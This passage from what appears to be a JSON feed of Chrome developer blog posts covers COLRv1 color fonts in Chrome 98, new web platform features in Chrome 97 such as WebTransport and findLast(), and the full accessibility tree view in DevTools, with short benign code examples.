Jonathan Kew, Laurence Penney,\nChris Lilley, David Jonathan Ross, Underware, Just van Rossum, Roel Nieskens, and\nothers for their contributions to COLRv1.",

Plus, it features support for font variations and reuses\nexisting shape definition formats in the font.</p>\n<figure> <img alt=\"Blue     and purple crystal ball emoji with reused stars on a brown base.\" decoding=\"async\" height=\"360\" loading=\"lazy\" sizes=\"(min-width: 360px) 360px, calc(100vw - 48px)\" src=\"https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format\" srcset=\"https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&w=200 200w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&w=228 228w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&w=260 260w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&w=296 296w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&w=338 338w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&w=385 385w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&w=439 439w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&w=500 500w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&w=571 571w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&w=650 650w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&w=720 720w\" width=\"360\"> <figcaption>Shape reuse in the crystal ball\n    emoji</figcaption> </figure>\n<p>Think about the crystal ball emoji as an example: The star-shaped highlights are\nthe same shape but different sizes, which means just one shape can be\nrepositioned and reused without duplication inside the file. The format allows\nyou to reuse a full glyph within a new glyph, without having to redundantly\nencode the same shapes for each glyph. Imagine a decorative color font with\nfloral decorations, where the same flower shapes are placed on different letters\nby just referencing existing color glyphs. For the web font use case, COLRv1\ncompresses well under woff2. For example, a test build of Twemoji using COLRv1\ntakes about 1.2 MB inflated, but is about 0.6MB in woff2 form. A build of the\nfull Noto Emoji Glyph set is reduced from 9MB for the bitmap version to 1.85MB\nin COLRv1+woff2 form.</p>\n<figure>\n<img alt=\"Bar chart comparing Noto Emoji as Bitmap font and COLRv1 font, about 9MB vs. 1.85MB\" decoding=\"async\" height=\"495\" loading=\"lazy\" sizes=\"(min-width: 800px) 800px, calc(100vw - 48px)\" src=\"https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format\" srcset=\"https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=200 200w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=228 228w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=260 260w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=296 296w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=338 338w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=385 385w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=439 439w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=500 500w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=571 571w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=650 650w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=741 741w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=845 845w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=964 964w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=1098 1098w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=1252 1252w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=1428 1428w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&w=1600 1600w\" width=\"800\">\n<figcaption>Noto Emoji font size CBDT/CBLC vs. COLRv1 after WOFF2 compression.\n</figcaption>\n</figure>\n<h2 id=\"color-font-use-cases\" tabindex=\"-1\"><a class=\"heading-link\" href=\"#color-font-use-cases\" aria-hidden=\"true\">#</a> Color font use cases</h2>\n<h3 id=\"catchy-headlines\" tabindex=\"-1\"><a class=\"heading-link\" href=\"#catchy-headlines\" aria-hidden=\"true\">#</a> Catchy headlines</h3>\n<p>A fresh color font makes visual highlights, headlines, and banners really pop\nout.</p>\n<figure> <div style=\"height: 420px; width: 100%;\"> <iframe style=\"height: 100%; width: 100%; border: 0;\" title=\"colrv1-underware-plakato on Glitch\" src=\"https://glitch.com/embed/#!/embed/colrv1-underware-plakato?attributionHidden=true&sidebarCollapsed=true&path=index.html&previewSize=100\" allow=\"camera; clipboard-read; clipboard-write; encrypted-media; geolocation; microphone; midi\" loading=\"lazy\"></iframe>\n</div>\n<figcaption><a href=\"https://www.underware.nl/blog/2022/01/plakato-color/\">Plakato Color Happy\n2022</a> featuring energetic sweep gradients, made by the innovative type\nfoundry <a href=\"https://underware.nl/\">Underware</a> (Twitter: <a href=\"https://twitter.com/underware\">@underware</a>, Instagram: <a href=\"https://www.instagram.com/underwarefoundry/\">@underwarefoundry</a>).

      "content_text": "Compact, compression-friendly, color vector fonts with all your favorite\ngradient flavors.\nIn Chrome 98, the Chrome and Fonts teams have added support for COLRv1, an\nevolution of the COLRv0 font format intended to make color fonts widespread by\nadding gradients, compositing and blending, and improved internal shape reuse\nfor crisp and compact font files that compress well.\n\nExamples in this blog post require a browser that supports\nCOLRv1 fonts. Try viewing this post in Chrome 98 or above.\n\n# Color now\nOn the web, text is generally drawn in a color specified in CSS. The font does\nnot define any particular color, it just indicates where pixels should be\nplaced. That's usually a good thing. CSS lets the author flexibly choose a\ncolor. However, sometimes a glyph contains multiple colors that together have\nmeaning. For example, this flag  with light blue, pink, and white stripes would not\nconvey the same meaning if it was simply drawn in the current text color.\nToday, for most users, emojis are the only color fonts they see. Emojis\ntypically appear on the web via the system emoji font, or by inserting images\n(which has its own complications, ). Large file\nsizes especially for bitmap-based color fonts have made it difficult to use web\nfonts for emoji. By supporting COLRv1, we hope to see a proliferation of\ncreative color font use on the web and beyond.\n# Show me your colors\nWe've created a couple of examples for you to play with:\n \n\n \n\n \n\nThe example assets from Google Fonts used in the example are live in the\nGoogle Fonts web API. They are\nnot listed in the directory at fonts.google.com as\nthey will only work on Chrome 98 or later and showcase experimental work.\nYou can now make your own COLRv1 fonts using free and open-source tools. Check\nout the nanoemoji font compiler\nwhich allows you to build COLRv1 fonts from SVG source images, then try them in\nChrome 98 or later. Try making your own spin on Bungee Spice by changing the\ngradient colors using\nthese instructions.\nFor example, you might modify the Bungee Spice font to have a blue and red gradient, like this:\n\nTweet your results to @googlefonts 🙂 Why not try a radial or sweep gradient?\n# New with COLRv1\nThe font format supports multiple ways to support color, all with different\ntradeoffs – but none have been successful on the web so far. (To learn more\nabout the tradeoffs,\ntake a look at Dominik's BlinkOn 15 conference talk.)\nChrome 98 brings support for COLRv1, an evolution of COLRv0. We hope that\nCOLRv1's combination of graphic capabilities and compact files will make it a\ngood choice for many color font use cases. COLRv1 adds gradients,\ncompositing, and blending, and improves\ninternal shape reuse to make even more compact files.\nCOLRv1 has expressive capability roughly equivalent to\nSVG Native plus\nblending and compositing added on\ntop. There are four types of color fills: solid colors, linear gradients, radial\ngradients, and sweep/conic gradients. COLRv1 lets you reposition and transform\nglyph elements using a full set of translate, rotate, sheer, and scale\ntransformations. Plus, it features support for font variations and reuses\nexisting shape definition formats in the font.\n  Shape reuse in the crystal ball\n    emoji \nThink about the crystal ball emoji as an example: The star-shaped highlights are\nthe same shape but different sizes, which means just one shape can be\nrepositioned and reused without duplication inside the file. The format allows\nyou to reuse a full glyph within a new glyph, without having to redundantly\nencode the same shapes for each glyph. Imagine a decorative color font with\nfloral decorations, where the same flower shapes are placed on different letters\nby just referencing existing color glyphs. For the web font use case, COLRv1\ncompresses well under woff2. For example, a test build of Twemoji using COLRv1\ntakes about 1.2 MB inflated, but is about 0.6MB in woff2 form. A build of the\nfull Noto Emoji Glyph set is reduced from 9MB for the bitmap version to 1.85MB\nin COLRv1+woff2 form.\n\n\nNoto Emoji font size CBDT/CBLC vs. COLRv1 after WOFF2 compression.\n\n\n# Color font use cases\n# Catchy headlines\nA fresh color font makes visual highlights, headlines, and banners really pop\nout.\n  \n\nPlakato Color Happy\n2022 featuring energetic sweep gradients, made by the innovative type\nfoundry Underware (Twitter: @underware, Instagram: @underwarefoundry). Read\nmore about Underware’s first COLRv1 release in their blog post.\n \n# No more image replacement: emoji fonts\nIf you support user generated content, your users probably use emojis. Today\nit's very common to scan text and replace any emoji encountered with images to\nensure consistent cross-platform rendering and the ability to support newer\nemojis than the OS supports. Those images then have to be switched back to text\nduring clipboard operations. Here's a real example:\n\n\nImage replacement in Google Chat\n\nIf you have an emoji font you just render the text in the font, like this:\n<style>@import url(https://fonts.googleapis.com/css2?family=Noto+Color+Emoji);.emoji {  font-family: \"Noto Color Emoji\", sans-serif;}</style><span class=\"emoji\">🙂</span>\nSimilarly, in an emoji reaction component, COLRv1 offers the opportunity to use\na compact font file instead of a catalog of image assets.\n  Emoji\nReaction Picker on GitHub \nImagine how many images you'd have to fetch for a complete emoji picker!\n# Color in icon fonts\nUsing color in icon fonts adds clarity and makes glyphs easier to understand.\n  \nMaterial two-tone icons from https://fonts.google.com/icons\n \n# Artistic expression\nSpace-efficient color fonts enable new forms of artistic expression in text on\nthe web. This example of a Kufi-style Arabic font uses color gradients as an\nartistic interpretation of what the ink flow of traditional calligraphy could\nlook like when applied to the Kufi style of Arabic writing, which originates\nfrom not being written with nib and ink but carved in stone.\n\nReem Kufi Ink,\nan Arabic font by Khaled Hosny \n# Feature detection\nAt the moment, figuring out whether a browser engine supports a specific color\nfont format is possible by means of user-agent sniffing or by searching in a\nlibrary like ChromaCheck by\n@PixelAmbacht to test rendering of color\nglyphs on Canvas. Both solutions are not optimal. Feature testing should detect\nonly a specific feature itself and avoid user agent sniffing. The ChromaCheck\nlibrary should not need to perform resource-intensive 2D canvas operations for\ndetermining support.\nThe Chrome team wants to improve that and has started a series of discussions\n[1,\n2] in the CSS working group\nto provide information on browser font technology support in JavaScript and\ndeclaratively in CSS. The team plans to release efficient feature detection for\ncolor font and other font technologies in a future version of Chrome.\nIf you would like to use color fonts in your project right now when COLRv1\nsupport is limited to Chrome, there are two ways you can do that: Ask your font\nvendor for a COLRv1 font that contains monochrome glyphs too.

      "summary": "\n  \n\nHere's what you need to know:\n\nWebTransport is a new option for sending real time messages\nbetween the client and server.\nYou can use feature detection to see what\ntypes of scripts a browser supports.\nSearching arrays from the end becomes a little\neasier.\nAnd there's plenty more.\n\nHappy New Year! I'm Pete LePage. Let's dive in and\nsee what's new for developers in Chrome 97.\n# Web Transport\nIf you're using Web Sockets or the WebRTC Data Channel API to send messages\nbetween your server and the page, there's a new option for you. WebTransport\nis a new API offering low-latency, bidirectional, client-server messaging.\nIt has lower latency than WebSockets, and unlike the RTC Data Channel API,\nwhich is designed for peer-to-peer messaging, the Web Transport API is\nspecifically designed for client-server messaging.\nIt supports sending data, reliably with its streams APIs, and unreliably with\nits datagram APIs. It's supported in web workers. And because it exposes a\nStreams compliant interface, it supports optimizations around backpressure.\nTo use it, you'll need a server that supports HTTP/3, which is generally\neasier than setting up and maintaining a WebRTC server. Open a new\nWebTransport instance, wait for it to connect, and you can start sending\ndata.\nconst url = 'https://example.com:4999/foo/bar';const transport = new WebTransport(url);await transport.ready;const writer = transport.datagrams.writable.getWriter();const data1 = new Uint8Array([65, 66, 67]);writer.write(data1);\nCheck out the article Experimenting with WebTransport on\nweb.dev for complete details.\n# Script type feature detection\nToday, we can use the nomodule attribute to detect support\nfor JavaScript modules in the browser. But there are several new feature\nproposals in the pipeline, like import maps, speculation rules, and bundle\npreloading. We need a way to know what a browser supports.\nEnter HTMLScriptElement.supports(). You can use it to\ndetermine what types of scripts you can use, and send the browser the best\noption.\nif (HTMLScriptElement.supports('importmap')) {  // Use <script type=\"importmap\" ...>} else if (HTMLScriptElement.supports('module')) {  // Use <script type=\"module\" ...>} else {  // Use classic method...}\n# New array prototypes\nI love it when JavaScript gets easier. Array and TypedArray now support\nthe findLast() and findLastIndex() static methods.\nThese functions are effectively the same as find() and\nfindIndex(), but search from the end of an array\ninstead of the beginning.\nFor example, to find the last number in an array that is larger than ten,\ncall findLast() with a test function that checks if the value is greater\nthan ten, and you're good to go.\nconst array1 = [5, 12, 8, 130, 44, 3, 6];function greaterThanTen(val) {  return val > 10;}const last = array1.findLast(greaterThanTen);// 44const lIdx = array1.findLastIndex(greaterThanTen);// 4\n# Emulate Chrome 100 in the UA string\nIn just a few months, we'll hit Chrome 100, a three digit version number.\nAny code that checks version numbers, or parses the UA string, should be\nchecked to make sure it handles three digits.\nThere's a flag called #force-major-version-to-100 that\nwill change the current version number to 100, so you can make sure\neverything works as expected.\n\n# And more!\nOf course there's plenty more.\nNew lines in form entries are now normalized in the same\nway as Gecko and WebKit, improving interoperability between browsers.\nWe're standardizing client hint names by prefixing them with sec-ch.\nFor example, dpr becomes sec-ch-dpr. We'll continue to support existing\nversions of these hints, but you should plan for their eventual deprecation\nand removal.\nClosed <details> elements are now searchable and can be\nlinked to. These hidden elements will automatically expand when find in page,\nScrollToTextFragment, and element fragment navigation are used.\n# Further reading\nThis covers only some of the key highlights.

      "content_text": "\n  \n\nHere's what you need to know:\n\nWebTransport is a new option for sending real time messages\nbetween the client and server.\nYou can use feature detection to see what\ntypes of scripts a browser supports.\nSearching arrays from the end becomes a little\neasier.\nAnd there's plenty more.\n\nHappy New Year! I'm Pete LePage. Let's dive in and\nsee what's new for developers in Chrome 97.\n# Web Transport\nIf you're using Web Sockets or the WebRTC Data Channel API to send messages\nbetween your server and the page, there's a new option for you. WebTransport\nis a new API offering low-latency, bidirectional, client-server messaging.\nIt has lower latency than WebSockets, and unlike the RTC Data Channel API,\nwhich is designed for peer-to-peer messaging, the Web Transport API is\nspecifically designed for client-server messaging.\nIt supports sending data, reliably with its streams APIs, and unreliably with\nits datagram APIs. It's supported in web workers. And because it exposes a\nStreams compliant interface, it supports optimizations around backpressure.\nTo use it, you'll need a server that supports HTTP/3, which is generally\neasier than setting up and maintaining a WebRTC server. Open a new\nWebTransport instance, wait for it to connect, and you can start sending\ndata.\nconst url = 'https://example.com:4999/foo/bar';const transport = new WebTransport(url);await transport.ready;const writer = transport.datagrams.writable.getWriter();const data1 = new Uint8Array([65, 66, 67]);writer.write(data1);\nCheck out the article Experimenting with WebTransport on\nweb.dev for complete details.\n# Script type feature detection\nToday, we can use the nomodule attribute to detect support\nfor JavaScript modules in the browser. But there are several new feature\nproposals in the pipeline, like import maps, speculation rules, and bundle\npreloading. We need a way to know what a browser supports.\nEnter HTMLScriptElement.supports(). You can use it to\ndetermine what types of scripts you can use, and send the browser the best\noption.\nif (HTMLScriptElement.supports('importmap')) {  // Use <script type=\"importmap\" ...>} else if (HTMLScriptElement.supports('module')) {  // Use <script type=\"module\" ...>} else {  // Use classic method...}\n# New array prototypes\nI love it when JavaScript gets easier. Array and TypedArray now support\nthe findLast() and findLastIndex() static methods.\nThese functions are effectively the same as find() and\nfindIndex(), but search from the end of an array\ninstead of the beginning.\nFor example, to find the last number in an array that is larger than ten,\ncall findLast() with a test function that checks if the value is greater\nthan ten, and you're good to go.\nconst array1 = [5, 12, 8, 130, 44, 3, 6];function greaterThanTen(val) {  return val > 10;}const last = array1.findLast(greaterThanTen);// 44const lIdx = array1.findLastIndex(greaterThanTen);// 4\n# Emulate Chrome 100 in the UA string\nIn just a few months, we'll hit Chrome 100, a three digit version number.\nAny code that checks version numbers, or parses the UA string, should be\nchecked to make sure it handles three digits.\nThere's a flag called #force-major-version-to-100 that\nwill change the current version number to 100, so you can make sure\neverything works as expected.\n\n# And more!\nOf course there's plenty more.\nNew lines in form entries are now normalized in the same\nway as Gecko and WebKit, improving interoperability between browsers.\nWe're standardizing client hint names by prefixing them with sec-ch.\nFor example, dpr becomes sec-ch-dpr. We'll continue to support existing\nversions of these hints, but you should plan for their eventual deprecation\nand removal.\nClosed <details> elements are now searchable and can be\nlinked to. These hidden elements will automatically expand when find in page,\nScrollToTextFragment, and element fragment navigation are used.\n# Further reading\nThis covers only some of the key highlights.

      "summary": "\nInterested in helping improve DevTools? Sign up to participate in Google User Research here.\n\nChrome DevTools is launching a full accessibility tree making it easier for developers to get an overview of the whole tree. In this post find out how this tree is created and how to use it in your work.\n          \n# What is the accessibility tree?\nAssistive technology such as screen readers use Chromium’s accessibility API to interact with web content. The underlying model of this API is the accessibility tree: a tree of accessibility objects that assistive technology can query for attributes and properties and perform actions on. Web developers shape and manipulate the accessibility tree primarily through DOM properties such as ARIA attributes for HTML.\nIn Chrome DevTools, we provide the accessibility pane to help developers understand how their content is exposed to assistive technology. Concretely, when a node is selected in the DOM tree viewer, the properties of the corresponding accessibility node displays in the pane together with a view of the node's ancestors and its immediate children.\n\n# How is the tree created?\nBefore we get to what this new full tree view looks like in DevTools, let us briefly go over what the accessibility tree is in more tangible terms. The accessibility tree is a derivative of the DOM tree. Its structure is roughly the same, but simplified to remove nodes with no semantic content such as a <div> element purely used for styling. Each node in the tree has a role such as Button or Heading, and often a name that can be either from ARIA attributes or derived from the node’s contents. If we look at an HTML document:\n<html><head>  <title>How old are you?</title></head><body>  <label for=\"age\">Age</label>  <input id=\"age\" type=\"number\" name=\"age\" value=\"42\">  <div>    <button>Back</button>    <button>Next</button>  </div></body></html>\nThe renderer in Chromium, named Blink, derives an internal accessibility tree roughly as follows.\nrole='rootWebArea' focusable name='How old are you?'  role='genericContainer' ignored    role='genericContainer' ignored      role='labelText'        role='staticText' name='Age'      role='spinButton' editable focusable name='Age' value='42'        role='genericContainer' editable          role='staticText' editable name='42'      role='genericContainer'        role='button' focusable name='Back'          role='staticText' name='Back'        role='button' focusable name='Next'          role='staticText' name='Next'\nNote that this representation contains multiple superfluous nodes with role genericContainer, which seemingly contradicts the statement above that the accessibility tree is a simplified derivative of the DOM tree. Still, most of these nodes only occur in the internal tree and would not be exposed to assistive technology. Since DevTools collects its accessibility information directly from the renderer process, this is the tree representation that DevTools handles.\n\nThe HTML example was borrowed from here which also contains more information about how accessibility works in Chromium.\n\n# Full accessibility tree in DevTools\nThe new, full accessibility tree synchronized with the DOM tree so developers can switch back and forth between the two trees. We hope that the new tree will prove more explorable, useful, and easier to use.\nNow that you know how the accessibility tree works, you can use DevTools to see how the new tree view looks. The following HTML document with a title, heading, and two buttons is used to show the tree.\n<!DOCTYPE html><title>Test</title><h1>Heading for example page</h1><div>  <button>Back</button>  <button>Next</button></div>\nThe previous tree view would only enable you to explore a single node and its ancestors.\n\nNow, when you toggle the new tree, it replaces the DOM tree view and allows you to see the full accessibility tree for the page:\n\n# Lazy tree construction\nTo make the tree performant even for larger sites, the tree is lazily constructed on the frontend as it is explored. Once a node is expanded in the tree, the children for the nodes are fetched through Chrome DevTools Protocol (CDP) and the tree is rebuilt.\n\n# Live\nThe new tree view is live and dynamically updates if the accessibility tree changes in the renderer. It hooks into the same mechanics that would notify assistive technology of changes to the tree, and uses that to emit events to the DevTools frontend with updated nodes.\nIn practice, the CDP backend listens for updates to the tree, keeps track of which nodes have been requested before, and sends events to the DevTools frontend if any of these nodes changes.\n          \n# The tale of many trees\nIn the description of what the accessibility tree is you learned how Blink constructs an accessibility tree for the DOM it is rendering, and DevTools fetches this tree through CDP. While this is true, we left out some complications in this description. In reality, there are quite a lot of different ways to experience the accessibility tree in Chromium.\nWhen designing the new tree view for DevTools, we have made some choices along the way about what part of Chromium’s accessibility internals we wanted to surface.\n# Platforms\nEvery platform has a different accessibility API and while the shape of the tree is the same across all platforms, the API for interacting with the tree is different, and the names of attributes can differ. DevTools shows Chromium’s internal tree where roles and attributes tend to match those defined in the ARIA specification.\n# Multiple frames and site isolation\nSince Chromium not only puts the content of every tab in different renderer processes but also isolates cross-site documents in different renderer processes, we have to connect to each out-of-process child document separately over CDP and fetch its accessibility tree. We then stitch these subtrees together on the frontend to give the illusion of one coherent tree, although they live in different renderer processes in Chromium.\n# Ignored and uninteresting nodes\nWe hide some nodes per default: ignored nodes, and nodes with role “generic” with no name. These nodes carry no semantic meaning and, in the case of ignored nodes, are not exposed to assistive technology. We hide these nodes to avoid cluttering the tree view. If we did not, the accessibility tree for most web pages would instead look something like this:\n\nThe caveat here is that this essentially means that we need to construct yet another tree than what is available on the backend. Say, for example, that we have nodes A, B, C, and X where A has child X and B, and X has child C. If X is an ignored node, we prune X from the tree and instead create a tree where C is a child to A.\n\nOn the frontend, we construct the full tree including ignored nodes and only prune them just before rendering the nodes. We do this for two reasons:\n\nIt makes it much simpler to handle node updates from the backend, since we have the same tree structure on both endpoints. For example, if the node B is removed in the example, we would receive an update for node X (since its children have changed), but if we had pruned that node we would struggle to figure out what to update.\nIt ensures that all DOM nodes have a corresponding accessibility node. When the tree is toggled, we select the node corresponding to the node currently selected in the DOM tree. So for the previous example, if the user toggles the tree while the DOM node corresponding to X is selected, we inject X between the nodes A and B and select X in the tree. This allows the user to inspect the accessibility node for all DOM nodes and help determine why the node is ignored.\n\n# Future ideas\nLaunching the new accessibility tree is just the start. We have a few ideas for future projects we could build on top of the new view, but we are also eager to hear your feedback!\n# Alternative filterings\nAs explained above, we currently filter out nodes that are deemed uninteresting. We could provide a way to disable this behavior and show all nodes, or provide alternative filterings such as Show landmark nodes or Show headings.\n# Highlight a11y issues\nWe could incorporate an “accessibility best practice” analysis with the tree and highlight accessibility issues directly on the offending nodes.\n# Surface accessibility actions in DevTools\nThe tree we currently show is purely one-way: It allows us to get an idea of what information would be fed to assistive technology when browsing a specific webpage. Accessibility actions represent the communication in the other direction: They allow assistive technology to act on the presented UI. We could surface such actions in DevTools to allow actions such as “clicking”, scrolling, or changing values on the page using the API available to assistive technology.",

While this is true, we left out some complications in this description. In reality, there are quite a lot of <a href=\"https://en.wikipedia.org/wiki/Blind_men_and_an_elephant\">different ways to experience</a> the accessibility tree in Chromium.\nWhen designing the new tree view for DevTools, we have made some choices along the way about what part of Chromium’s accessibility internals we wanted to surface.</p>\n<h3 id=\"platforms\" tabindex=\"-1\"><a class=\"heading-link\" href=\"#platforms\" aria-hidden=\"true\">#</a> Platforms</h3>\n<p>Every platform has a different accessibility API and while the shape of the tree is the same across all platforms, the API for interacting with the tree is different, and the names of attributes can differ. DevTools shows Chromium’s internal tree where roles and attributes tend to match those defined in the <a href=\"https://www.w3.org/TR/wai-aria-1.1/\">ARIA</a> specification.</p>\n<h3 id=\"multiple-frames-and-site-isolation\" tabindex=\"-1\"><a class=\"heading-link\" href=\"#multiple-frames-and-site-isolation\" aria-hidden=\"true\">#</a> Multiple frames and site isolation</h3>\n<p>Since Chromium not only puts the content of every tab in different renderer processes but also <a href=\"https://www.chromium.org/developers/design-documents/site-isolation\">isolates cross-site documents in different renderer processes</a>, we have to connect to each out-of-process child document separately over CDP and fetch its accessibility tree. We then stitch these subtrees together on the frontend to give the illusion of one coherent tree, although they live in different renderer processes in Chromium.</p>\n<h3 id=\"ignored-and-uninteresting-nodes\" tabindex=\"-1\"><a class=\"heading-link\" href=\"#ignored-and-uninteresting-nodes\" aria-hidden=\"true\">#</a> Ignored and uninteresting nodes</h3>\n<p>We hide some nodes per default: ignored nodes, and nodes with role “generic” with no name.

      "content_text": "\nInterested in helping improve DevTools? Sign up to participate in Google User Research here.\n\nChrome DevTools is launching a full accessibility tree making it easier for developers to get an overview of the whole tree. In this post find out how this tree is created and how to use it in your work.\n          \n# What is the accessibility tree?\nAssistive technology such as screen readers use Chromium’s accessibility API to interact with web content. The underlying model of this API is the accessibility tree: a tree of accessibility objects that assistive technology can query for attributes and properties and perform actions on. Web developers shape and manipulate the accessibility tree primarily through DOM properties such as ARIA attributes for HTML.\nIn Chrome DevTools, we provide the accessibility pane to help developers understand how their content is exposed to assistive technology. Concretely, when a node is selected in the DOM tree viewer, the properties of the corresponding accessibility node displays in the pane together with a view of the node's ancestors and its immediate children.\n\n# How is the tree created?\nBefore we get to what this new full tree view looks like in DevTools, let us briefly go over what the accessibility tree is in more tangible terms. The accessibility tree is a derivative of the DOM tree. Its structure is roughly the same, but simplified to remove nodes with no semantic content such as a <div> element purely used for styling. Each node in the tree has a role such as Button or Heading, and often a name that can be either from ARIA attributes or derived from the node’s contents. If we look at an HTML document:\n<html><head>  <title>How old are you?</title></head><body>  <label for=\"age\">Age</label>  <input id=\"age\" type=\"number\" name=\"age\" value=\"42\">  <div>    <button>Back</button>    <button>Next</button>  </div></body></html>\nThe renderer in Chromium, named Blink, derives an internal accessibility tree roughly as follows.\nrole='rootWebArea' focusable name='How old are you?'  role='genericContainer' ignored    role='genericContainer' ignored      role='labelText'        role='staticText' name='Age'      role='spinButton' editable focusable name='Age' value='42'        role='genericContainer' editable          role='staticText' editable name='42'      role='genericContainer'        role='button' focusable name='Back'          role='staticText' name='Back'        role='button' focusable name='Next'          role='staticText' name='Next'\nNote that this representation contains multiple superfluous nodes with role genericContainer, which seemingly contradicts the statement above that the accessibility tree is a simplified derivative of the DOM tree. Still, most of these nodes only occur in the internal tree and would not be exposed to assistive technology. Since DevTools collects its accessibility information directly from the renderer process, this is the tree representation that DevTools handles.\n\nThe HTML example was borrowed from here which also contains more information about how accessibility works in Chromium.\n\n# Full accessibility tree in DevTools\nThe new, full accessibility tree synchronized with the DOM tree so developers can switch back and forth between the two trees. We hope that the new tree will prove more explorable, useful, and easier to use.\nNow that you know how the accessibility tree works, you can use DevTools to see how the new tree view looks. The following HTML document with a title, heading, and two buttons is used to show the tree.\n<!DOCTYPE html><title>Test</title><h1>Heading for example page</h1><div>  <button>Back</button>  <button>Next</button></div>\nThe previous tree view would only enable you to explore a single node and its ancestors.\n\nNow, when you toggle the new tree, it replaces the DOM tree view and allows you to see the full accessibility tree for the page:\n\n# Lazy tree construction\nTo make the tree performant even for larger sites, the tree is lazily constructed on the frontend as it is explored. Once a node is expanded in the tree, the children for the nodes are fetched through Chrome DevTools Protocol (CDP) and the tree is rebuilt.\n\n# Live\nThe new tree view is live and dynamically updates if the accessibility tree changes in the renderer. It hooks into the same mechanics that would notify assistive technology of changes to the tree, and uses that to emit events to the DevTools frontend with updated nodes.\nIn practice, the CDP backend listens for updates to the tree, keeps track of which nodes have been requested before, and sends events to the DevTools frontend if any of these nodes changes.\n          \n# The tale of many trees\nIn the description of what the accessibility tree is you learned how Blink constructs an accessibility tree for the DOM it is rendering, and DevTools fetches this tree through CDP. While this is true, we left out some complications in this description. In reality, there are quite a lot of different ways to experience the accessibility tree in Chromium.\nWhen designing the new tree view for DevTools, we have made some choices along the way about what part of Chromium’s accessibility internals we wanted to surface.\n# Platforms\nEvery platform has a different accessibility API and while the shape of the tree is the same across all platforms, the API for interacting with the tree is different, and the names of attributes can differ. DevTools shows Chromium’s internal tree where roles and attributes tend to match those defined in the ARIA specification.\n# Multiple frames and site isolation\nSince Chromium not only puts the content of every tab in different renderer processes but also isolates cross-site documents in different renderer processes, we have to connect to each out-of-process child document separately over CDP and fetch its accessibility tree. We then stitch these subtrees together on the frontend to give the illusion of one coherent tree, although they live in different renderer processes in Chromium.\n# Ignored and uninteresting nodes\nWe hide some nodes per default: ignored nodes, and nodes with role “generic” with no name. These nodes carry no semantic meaning and, in the case of ignored nodes, are not exposed to assistive technology. We hide these nodes to avoid cluttering the tree view. If we did not, the accessibility tree for most web pages would instead look something like this:\n\nThe caveat here is that this essentially means that we need to construct yet another tree than what is available on the backend. Say, for example, that we have nodes A, B, C, and X where A has child X and B, and X has child C. If X is an ignored node, we prune X from the tree and instead create a tree where C is a child to A.\n\nOn the frontend, we construct the full tree including ignored nodes and only prune them just before rendering the nodes. We do this for two 